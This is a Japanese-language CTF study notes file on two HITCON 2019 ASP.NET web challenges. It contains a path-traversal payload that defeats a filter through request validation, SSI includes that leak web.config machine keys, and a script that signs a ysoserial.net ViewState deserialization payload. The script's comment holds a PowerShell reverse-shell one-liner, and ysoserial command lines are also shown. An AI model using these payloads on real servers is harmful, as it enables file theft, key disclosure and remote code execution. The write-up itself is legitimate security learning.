<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [writeup](#writeup)
  - [ASP.NET / bypass filter with .NET request validation (hitcon2019 buggy.net)](#aspnet--bypass-filter-with-net-request-validation-hitcon2019-buggynet)
  - [ASP.NET / SSI / Viewstate serialize / ysoserial.net (why so serials?)](#aspnet--ssi--viewstate-serialize--ysoserialnet-why-so-serials)
  - [](#)
  - [](#-1)
  - [](#-2)
  - [](#-3)
- [memo](#memo)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# writeup
## ASP.NET / bypass filter with .NET request validation (hitcon2019 buggy.net)
https://github.com/orangetw/My-CTF-Web-Challenges#buggy.net  
https://ctftime.org/writeup/16802  
- **entrypoint**  
以下のソース`default.aspx`が与えられる。  
明らかにLFIできそうだけど`Request.Form["filename"].Contains("..")`でそれを検知している。  
```aspx
bool isBad = false;
try {
    if ( Request.Form["filename"] != null ) {
        isBad = Request.Form["filename"].Contains("..") == true;
    }
} catch (Exception ex) {
    
} 

try {
    if (!isBad) {
        Response.Write(System.IO.File.ReadAllText(@"C:\inetpub\wwwroot\" + Request.Form["filename"]));
    }
} catch (Exception ex) {

}
```
サイトにアクセスすると以下のようにバージョンがわかり、ASP.NET 4.0だとわかる。  
```txt
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
[...]
```
よくわからんけどどうやらASPの`Request.Form`に初めにアクセスするときに、
`validateRequest="false"`になっていない限り、ASPが自動で`Request.Form`や`Request.QueryString`の値
をチェックして`<x`みたいなXSSがないかどうか確認して、もし検知すれば例外をスローするらしい。  
そして、その例外をスローするのははじめに`Request`オブジェクトにアクセスしたときだけで、それ以降は
`Request.Form["filename"]`みたいにして普通に値を取り出せるらしい？？？  
そして、はじめに例外をスローするのに時間がかかるらしくて、はじめに例外をスローして、if文の中には
入らないけど例外でストップするのは、そのあとのLFIを実行した後になる、らしい？？？  
- **payload**  
```txt
GET / HTTP/1.1
Host: 52.197.162.211
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Referer: http://52.197.162.211/

filename=%2E%2E%5C%2E%2E%5CFLAG.txt&o=%3Cx
```
以下でも行けるらしい。`charset=ibm500`になってる…よくわからん…  
```python
from urllib import quote

s = lambda x: quote(x.encode('ibm500'))
print '%s=%s&x=%s' % (s('filename'), s('../../FLAG.txt', s('<x>'))
```
## ASP.NET / SSI / Viewstate serialize / ysoserial.net (why so serials?)
https://github.com/orangetw/My-CTF-Web-Challenges#why-so-serials  
- **entrypoint**  
以下のソース`default.aspx`が与えられる。  
ファイルをアップロードできるが、拡張子を`blacklist`でチェックしている。  
`String upload_base = Server.MapPath("/") + "files/" + ip + "/";`よりWebrootに保存してるので`.aspx`とかがもしアップロードできればWebshellになったのに…  
`.shtml`,`.stm`によるSSIが使える。これでASP.NETとしてコマンドを実行できる。  
```aspx
<%@ Page Language="C#" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e) {
        if (FileUpload1.HasFile) {
            try {
                System.Web.HttpContext context = System.Web.HttpContext.Current;
                String filename = FileUpload1.FileName;
                String extension = System.IO.Path.GetExtension(filename).ToLower();
                String[] blacklists = {".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer"};
                if (blacklists.Any(extension.Contains)) {
                    Label1.Text = "What do you do?";
                } else {
                    String ip = context.Request.ServerVariables["REMOTE_ADDR"];
                    String upload_base = Server.MapPath("/") + "files/" + ip + "/";
                    if (!System.IO.Directory.Exists(upload_base)) {
                        System.IO.Directory.CreateDirectory(upload_base);
                    }
                    filename = Guid.NewGuid() + extension;
                    FileUpload1.SaveAs(upload_base + filename);
                    Label1.Text = String.Format("<a href='files/{0}/{1}'>This is file</a>", ip, filename);
                }
            }
            catch (Exception ex)
            {
                Label1.Text = "ERROR: " + ex.Message.ToString();
            }
        } else {
            Label1.Text = "You have not specified a file.";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
    <title>Why so Serials?</title>
</head>
<body>
  <div class="container">
    <div class="jumbotron" style='background: #f7f7f7'>
        <h1>Why so Serials?</h1>
        <p>May the <b><a href='Default.aspx.txt'>source</a></b> be with you!</p>
        <br />
        <form id="form1" runat="server">
            <div class="input-group">
                <asp:FileUpload ID="FileUpload1" runat="server" class="form-control"/>
                <span class="input-group-btn">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click" 
                 Text="GO" class="btn"/>
                </span>
            </div>
            <br />
            <br />
            <br />
            <div class="alert alert-primary text-center">
                <asp:Label ID="Label1" runat="server"></asp:Label>
            </div>
        </form>
    </div>
  </div>
</body>
</html>
```
`paylaod.shtml`をアップロードして実行させようとすると、`The CMD option is not enabled for #EXEC calls`というエラー。  
たぶん`exec`機能だけを制限するように設定されている。  
```txt
<!--#exec cmd="whoami" -->
```
以下で`web.config`をみる。  
```txt
<!--#include file="..\..\web.config" -->
```
```txt
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off"/>
    <machineKey validationKey="b07b0f97365416288cf0247cffdf135d25f6be87" decryptionKey="6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3" decryption="DES" validation="MD5" />
</system.web>
</configuration>
```
また、このサイトでは暗号化なし、署名ありでViewStateが有効になってるっぽい。  
署名の鍵はわかったのでPayloadをViewStateに鍵で署名すればよい！  
writeupではいろいろソースを確認してどういう仕様になっているかを確認していたが、以下のようになっているらしい。  
```python
MAC_HASH = MD5(serialized_data_binary + validation_key + 0x00000000 )
VIEWSATE = Base64_Encode(serialized_data_binary + MAC_HASH)
```
最終的なPayloadは以下のようにしてysoserial.netの出力を埋め込んで作成するらしい。  
```python
#!/usr/bin/env python3
import hashlib
import base64


'''
Generate PowerShell reverse shell command
> powershell "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c=New-Object Net.Sockets.TCPClient(''127.0.0.1'',6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+''PS ''+(pwd).Path+''> '';$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'))"

Generate deserialization gadget by ysoserial.net
https://github.com/pwntester/ysoserial.net
> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell -nop -enc {reverse shell command}"
'''
serialized_data = '{base64 encoded serialized data from ysoserial}'
payload = base64.b64decode(serialized_data)

# Get machine key by uploading .shtml file (Server Side Include)
validation_key = bytes.fromhex('b07b0f97365416288cf0247cffdf135d25f6be87')

'''
MAC_Hash = MD5(serialized_data_binary + validation_key + 0x00000000 )

Simple stack trace to get MAC Hash:
System.Web.UI.ObjectStateFormatter.Serialize(object stateGraph, Purpose purpose)
    MachineKeySection.GetEncodedData(byte[] buf, byte[] modifier, int start, ref int length)
        MachineKeySection.HashData(byte[] buf, byte[] modifier, int start, int length)
            HashDataUsingNonKeyedAlgorithm(HashAlgorithm hashAlgo, byte[] buf, byte[] modifier, int start, int length, byte[] validationKey)
                UnsafeNativeMethods.GetSHA1Hash(byte[] data, int dataSize, byte[] hash, int hashSize);
'''
mac = hashlib.md5(payload + validation_key + b'\x00\x00\x00\x00').digest()
payload = base64.b64encode(payload + mac).decode()
print(payload)
```
https://github.com/pwntester/ysoserial.net  
viewstate用のPayloadを作成する機能があって、MD5とかSHA1とかを選択できるっぽいので同じことがysoserial.netの機能でできそう？？？  
https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/  
ここに良さげな参考資料がある。  
`.NET Framework >= 4.5`では  
```txt
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
`.NET Framework <= 4.0 (legacy)`では以下を使う的なことが書いてる？？  
```txt
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# memo
